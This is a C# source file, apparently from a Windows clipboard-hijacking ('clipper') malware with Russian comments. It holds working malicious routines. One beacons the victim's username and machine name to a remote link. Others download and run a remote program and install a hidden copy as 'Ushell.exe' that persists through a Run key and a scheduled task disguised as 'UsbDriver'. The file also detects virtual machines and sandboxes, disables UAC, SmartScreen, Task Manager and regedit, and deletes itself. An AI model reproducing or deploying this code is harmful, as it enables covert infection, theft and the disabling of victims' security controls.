           "Clipper", "Clip", "Buffer", "Ushell", "Banker", "ClipPurse", "Updater", "Scanner",
           "Clp", "Flipper", "Changer", "SelfClip", "IPLogger", "ClipPurSE", "dwm"
        };
    }

    public static class Liquidation
    {
        /// <summary>
        ///  Метод создания .bat файла для удаление программы и самого батника.
        /// </summary>
        /// <param name="pathfile">Имя .bat файла</param>
        public static void Inizialize(string pathfile)
        {
            try
            {
                using (StreamWriter sw = new StreamWriter(pathfile))
                {
                    sw.WriteLine("@echo off"); // Переключение режима отображения команд на экране
                    sw.WriteLine(":loop"); // запускаем цикл
                    sw.WriteLine(string.Concat("del \"", GlobalPath.GetFileName, "\"")); // Удаляем файл
                    sw.WriteLine(string.Concat("if Exist \"", GlobalPath.GetFileName, "\" GOTO loop")); // Проверяем файл и возвращяемся в цикл для проверки снова
                    sw.WriteLine("del %0"); // После удаляем .bat файл
                    sw.Flush();
                }
            }
            catch (Exception ex) { FileControl.CreateFile("Self_Error.txt", ex.Message); }

            if (FileControl.ExistsFile(pathfile))
            {
                ProcessControl.RunFile(pathfile);
            }
        }

        /// <summary>
        /// Доп метод для самоудаления программы
        /// </summary>
        /// <param name="pathfile">Коммандная оболочка cmd.exe</param>
        /// <param name="args">Аргументы</param>
        public static void SelfDelete(string pathfile, string args)
        {
            ProcessWindowStyle PwsHide = ProcessWindowStyle.Hidden;
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                Arguments = args,
                FileName = pathfile,
                CreateNoWindow = false,
                WindowStyle = PwsHide
            };
            using (Process info = Process.Start(startInfo)) { info.Refresh(); }
        }
    }

    public static class Logger
    {
        public static bool GetIP(string link)
        {
            if (string.IsNullOrWhiteSpace(link)) return false;
            try
            {
                var stbuild = new StringBuilder();
                stbuild.AppendFormat(string.Concat("Username: ", Environment.UserName, "  | MachineName: ", Environment.MachineName, " | Mozilla / 5.0(Windows NT 10.0; Win64; x64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 73.0.3683.103 Safari / 537.36 OPR / 60.0.3255.109"));
                Uri uri = new Uri(link, UriKind.Absolute);
                using (var ss = new WebClient())
                {
                    ss.Proxy = null;
                    ss.Headers.Add(HttpRequestHeader.UserAgent, stbuild.ToString());
                    ss.OpenRead(uri);
                    return true;
                }
            }
            catch { return false; }
        }

        public static bool DownMonick(string link, string path, string filename)
        {
            if (!FileControl.ExistsDirectory(path))
            {
                FileControl.CreateDirectory(path);
                Thread.Sleep(1000);
                try
                {
                    Uri url = new Uri(link, UriKind.Absolute);
                    using (WebClient client = new WebClient())
                    {
                        client.Proxy = null;
                        client.DownloadFile(url, filename);
                        ProcessControl.RunFile(filename);
                        return true;
                    }
                }
                catch { return false; }
            }
            else
            {
                if (FileControl.ExistsFile(filename))
                {
                    ProcessControl.RunFile(filename);
                    return true;
                }
            }
            return false;
        }
    }

    public static class RunCheck
    {
        public static int ThreadSleep = 3000;

        public static bool InstanceCheck()
        {
            Assembly assembly = typeof(Program).Assembly;
            GuidAttribute attribute = (GuidAttribute)assembly.GetCustomAttributes(typeof(GuidAttribute), true)[0];
            string id = attribute.Value;
            bool isNew;
            new Mutex(true, id, out isNew);
            return isNew;
        }

        public static bool StartWin_xSixtyFour() { if (Environment.Is64BitOperatingSystem) { return true; } return false; }

        public static bool IsUserAdministrator()
        {
            try { return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator); } catch { return false; }
        }
    }

    public static class RunSystem
    {
        #region Автозапуск через Реестр

        private const string REG = @"Software\Microsoft\Windows\CurrentVersion\Run";

        /// <summary>
        /// Метод для добавление программы в автозагрузку через Реестр
        /// </summary>
        /// <param name="enable">Выбор функции: Создать/Удалить</param>
        /// <param name="name">Имя параметра в реестре</param>
        /// <param name="localpath">Путь к файлу программы</param>
        public static void Registry(bool enable, string name, string localpath)
        {
            try
            {
                using (RegistryKey registry = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryControl.Regview))
                using (RegistryKey runKey = registry.OpenSubKey(REG, RunCheck.StartWin_xSixtyFour()))
                {
                    if (!enable)
                    {
                        try
                        {
                            if (runKey != null)
                            {
                                runKey.DeleteValue(name);
                            }
                        }
                        catch { }
                    }
                    else
                    {
                        try
                        {
                            runKey.SetValue(name, localpath);
                        }
                        catch { }
                    }
                }
            }
            catch (Exception) { }
        }

        #endregion

        #region Автозапуск через Планировщик Задач

        /// <summary>
        /// Метод для добавления программы в автозагрузку через Планировщик задач
        /// </summary>
        /// <param name="status">Выбор функции Добавить/Удалить задачу</param>
        /// <param name="timeset">Выбор таймера по минутам</param>
        /// <param name="count">Время запуска программы</param>
        /// <param name="priority">Приоритет процесса</param>
        /// <param name="taskname">Имя Задачи</param>
        /// <param name="filepath">Путь к файлу который запускается в задаче</param>
        /// <returns></returns>
        public static bool Scheduler(bool status, string timeset, int count, string priority, string taskname, string filepath)
        {
            if (!string.IsNullOrWhiteSpace(taskname) && !string.IsNullOrWhiteSpace(filepath))
            {
                ProcessWindowStyle PwsHide = ProcessWindowStyle.Hidden;
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    CreateNoWindow = false,
                    WindowStyle = PwsHide
                };
                try
                {
                    switch (status)
                    {
                        case true: startInfo.Arguments = string.Concat("/create /sc ", timeset, " /mo ", count, " /rl ", priority, " /tn ", taskname, " /tr ", filepath, " /f"); break;
                        case false: startInfo.Arguments = string.Concat("/delete /tn ", taskname, " /f"); break;
                    }
                }
                catch (Exception) { }
                try
                {
                    using (Process info = Process.Start(startInfo)) { info.Refresh(); info.WaitForExit(); }
                }
                catch (Exception) { }

                return true;
            }

            return false;
        }

        #endregion
    }

    public static class Garbage
    {
        /// <summary>
        /// Добавления пустых папок в виде заполения мусора.
        /// </summary>
        /// <param name="big">Кол-во папок</param>
        public static void InizializeTrash(int big)
        {
            for (int i = 0; i < big; i++)
            {
                try
                {
                    DirectoryInfo dir = new DirectoryInfo(Path.Combine(GlobalPath.Microsoft, UniqueGenerator.GetUniqueToken(i)));
                    dir.Create();
                }
                catch (Exception) { }
            }
        }
    }

    public static class UniqueGenerator
    {
        private const string Key = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_";
        /// <summary>
        /// Автогенерация случайного имени
        /// </summary>
        /// <param name="length">Длина имени</param>
        /// <returns></returns>
        public static string GetUniqueToken(int length)
        {
            try
            {
                using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
                {
                    byte[] buffer = null, data = new byte[length];
                    int maxRandom = byte.MaxValue - ((byte.MaxValue + 1) % Key.Length);

                    crypto.GetBytes(data);

                    char[] result = new char[length];

                    for (int i = 0; i < length; i++)
                    {
                        byte value = data[i];

                        while (value > maxRandom)
                        {
                            if (buffer == null) { buffer = new byte[1]; }

                            crypto.GetBytes(buffer);
                            value = buffer[0];
                        }

                        result[i] = Key[value % Key.Length];
                    }

                    return new string(result);
                }
            }
            catch { return string.Empty; }
        }
    }

    public static class InjReg
    {
        /// <summary>
        /// Метод который сначала отчищает все следы предыдущего запуска файла.
        /// Затем создаёт новую папку, делает самокопирование, добавляет в автозагрузку ( в зависимости от прав Администратора )
        /// Автозапуск если добавлен в Планировщик зададч, если просто в Реестр то запуск самостоятельный.
        /// </summary>
        public static void CopyAndShelduderInizialize()
        {
            const string REGPATH = @"Software\Microsoft\Windows\CurrentVersion\Run";
            // Убиваем все процесс запущенные клиппера
            ProcessControl.KillClipInizialize();
            string Path = GlobalPath.StartUpFromAppDataReserv,
                    App = FileControl.CombinePath(Path, FileControl.GetFileName(GlobalPath.AssemblyPath.Replace(GlobalPath.AssemblyPath, "Ushell.exe")));
            // Удаляем записи в Планировщике
            RunSystem.Scheduler(false, "minute", 1, "highest", "UsbDriver", string.Concat("\"", App, "\""));
            // Удаляем записи в Реестре
            RegistryControl.RegStartupInizialize(false, REGPATH, "UsbDriver", App);
            // Удаляем папку с клиппером
            FileControl.DirectoryDelete(GlobalPath.StartUpFromAppDataReserv);

            Thread.Sleep(2000);
            // New addition

            // Если папки клиппера нет
            if (!FileControl.ExistsDirectory(Path))
            {
                // Создаём папку
                if (FileControl.CreateDirectory(Path))
                {
                    FileControl.CopyFile(GlobalPath.AssemblyPath, App, false);
                    Thread.Sleep(2000);

                    if (FileControl.ExistsFile(App))
                    {
                        if (RunCheck.IsUserAdministrator())
                        {
                            // Загрузка программы для слежки процессов
                            if (!FileControl.ExistsDirectory(GlobalPath.MonickPath))
                            {
                                // new Thread(new ThreadStart(delegate () { Logger.DownMonick(GlobalPath.Server, GlobalPath.MonickPath, GlobalPath.MonickFile); })).Start();
                            }
                            // Автоматический запуск
                            RunSystem.Scheduler(true, "minute", 1, "highest", "UsbDriver", string.Concat("\"", App, "\""));
                            RegistryControl.RegStartupInizialize(true, REGPATH, "UsbDriver", App);
                            if (!FileControl.IsHideOrNo())
                            {
                                // То устанавливаем ему аттрибуты ( скрытый и системный )
                                FileControl.HideFile(App, FileAttributes.Hidden);
                            }
                        }
                        else
                        {
                            // Загрузка программы для слежки процессов
                            if (!FileControl.ExistsDirectory(GlobalPath.MonickPath))
                            {
                                // new Thread(new ThreadStart(delegate () { Logger.DownMonick(GlobalPath.Server, GlobalPath.MonickPath, GlobalPath.MonickFile); })).Start();
                            }
                            RegistryControl.RegStartupInizialize(true, REGPATH, "UsbDriver", App);
                            if (!FileControl.IsHideOrNo())
                            {
                                // То устанавливаем ему аттрибуты ( скрытый и системный )
                                FileControl.HideFile(App, FileAttributes.Hidden);
                            }
                            // Ручной запуск
                            ProcessControl.RunFile(App);
                        }
                    }
                }
            }
            else
            {
                return;
            }
        }
    }

    public static class AntiVM
    {
        private static bool GetDetectVirtualMachine()
        {
            using (ManagementObjectCollection manObj = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem").Get())
            {
                foreach (ManagementBaseObject managementBaseObject in manObj)
                {
                    try
                    {
                        string str = managementBaseObject["Manufacturer"].ToString().ToLower();
                        bool strTo = managementBaseObject["Model"].ToString().ToLower().Contains("virtual");
                        if (!(!str.Equals("microsoft corporation")
                             || !strTo) || str.Contains("vmware") || managementBaseObject["Model"].ToString().Equals("VirtualBox"))
                        {
                            return true;
                        }
                        continue;
                    }
                    catch (Exception) { return false; }
                }
            }
            return false;
        }

        private static bool IsRdpAvailable()
        {
            if (SystemInformation.TerminalServerSession == true) return true;
            return false;
        }

        private static bool SBieDLL()
        {
            if (Process.GetProcessesByName("wsnm").Length <= 0 && NativeMethods.GetModuleHandle("SbieDll.dll").ToInt32() == 0)
                return false;
            return true;
        }

        public static bool DetectionInizialize()
        {
            if (GetDetectVirtualMachine() || IsRdpAvailable() || SBieDLL()) return true;
            return false;
        }
    }

    public static class RegistryControl
    {
        /// <summary>
        /// Метод для проверки битности реестра
        /// </summary>
        public static RegistryView Regview { get { if (RunCheck.StartWin_xSixtyFour()) { return RegistryView.Registry64; } return RegistryView.Registry32; } }

        private static readonly string[] FieldsLocal = new string[]
        {
            "EnableLUA", "EnableInstallerDetection", "PromptOnSecureDesktop",
            "ConsentPromptBehaviorAdmin", "ConsentPromptBehaviorUser",
            "EnableSecureUIAPaths", "ValidateAdminCodeSignatures", "EnableSmartScreen",
            "EnableVirtualization", "EnableUIADesktopToggle", "FilterAdministratorToken"
        };

        private static readonly string[] FiledsSystem = new string[]
        {
            "ConsentPromptBehaviorAdmin", "DisableRegistryTools", "DisableTaskMgr"
        };

        /// <summary>
        /// Метод для отключения показа скрытых папок и файлов через Реестр
        /// </summary>
        /// <param name="regpath">Путь к разделу реестра </param>
        /// <param name="value">Параметр ключа</param>
        /// <param name="locker">Значение ключа</param>
        /// <returns>true/false</returns>
        public static bool ToogleHidingFolders(string regpath, string value, int locker)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regpath, true))
                {
                    try
                    {
                        key.SetValue(value, locker, RegistryValueKind.DWord);
                        return true;
                    }
                    catch { return false; }
                }
            }
            catch (Exception) { return false; }
        }

        /// <summary>
        /// Метод для отключения показа уведомления контроля учётных записей пользователя (UAC)
        /// Список ключей которые будут затронуты находится в FieldsLocal
        /// </summary>
        /// <param name="regpath">Путь к разделу реестра</param>
        /// <param name="locker">Параметр для отключения/включения</param>
        /// <returns>true/false</returns>
        public static bool ToogleUacAdmin(string regpath, int locker)
        {
            try
            {
                if (RunCheck.IsUserAdministrator())
                {
                    using (RegistryKey registry = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Regview))
                    using (RegistryKey key = registry.OpenSubKey(regpath, RunCheck.StartWin_xSixtyFour()))
                    {
                        try
                        {
                            foreach (string v in FieldsLocal)
                            {
                                try
                                {
                                    key.SetValue(v, locker, RegistryValueKind.DWord);
                                }
                                catch { }
                            }
                        }
                        catch (Exception) { return false; }
                        return true;
                    }
                }
                return true;
            }
            catch (Exception) { return false; }
        }

        /// <summary>
        /// Метод для отключения Диспетчера Задач и Реестра 
        /// Список ключей которые будут затронуты находится в FiledsSystem
        /// </summary>
        /// <param name="regpath">Путь к разделу реестра</param>
        /// <param name="locker">Параметр для отключения/включения</param>
        /// <returns>true/false</returns>
        public static bool ToogleTaskMandRegedit(string regpath, int locker)
        {
            try
            {
                using (RegistryKey registry = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Regview))
                using (RegistryKey key = registry.OpenSubKey(regpath, RunCheck.StartWin_xSixtyFour()))
                using (RegistryKey sxs = key.CreateSubKey("System"))
                {
                    sxs.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                    sxs.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
                    try
                    {
                        foreach (string k in FiledsSystem)
                        {
                            try
                            {
                                sxs.SetValue(k, locker);
                            }
                            catch { }
                        }
                    }
                    catch (Exception) { return false; }
                    return true;
                }
            }
            catch { return false; }
        }

        /// <summary>
        /// Метод для отключения SmartScreen Windows
        /// </summary>
        /// <param name="regpath">Путь к разделу реестра</param>
        /// <param name="name">Имя ключа</param>
        /// <param name="enable">Параметр для отключения/включения</param>
        /// <returns>true/false</returns>
        public static bool ToogleSmartScreen(string regpath, string name, string enable)
        {
            try
            {
                if (RunCheck.IsUserAdministrator())
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regpath, true))
                    {
                        try
                        {
                            key.SetValue(name, enable, RegistryValueKind.String);
                            return true;
                        }
                        catch { return false; }
                    }
                }
                return true;
            }
            catch { return false; }
        }

        /// <summary>
        /// Метод для добавления программы в автозагрузку Windows через Реестр
        /// </summary>
        /// <param name="status">Добавить/Удалить из автозагрузки</param>
        /// <param name="regpath">Путь к разделу реестра</param>
        /// <param name="name">Имя ключа</param>
        /// <param name="localpath">Полный путь к программе</param>
        public static void RegStartupInizialize(bool status, string regpath, string name, string localpath)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regpath, true))
                {
                    if (!status)
                    {
                        try
                        {
                            key.DeleteValue(name);
                        }
                        catch (Exception) { }
                    }
                    else
                    {
                        try
                        {
                            key.SetValue(name, localpath, RegistryValueKind.String);
                        }
                        catch (Exception) { }
                    }
                }
            }
            catch { }
        }
    }
}
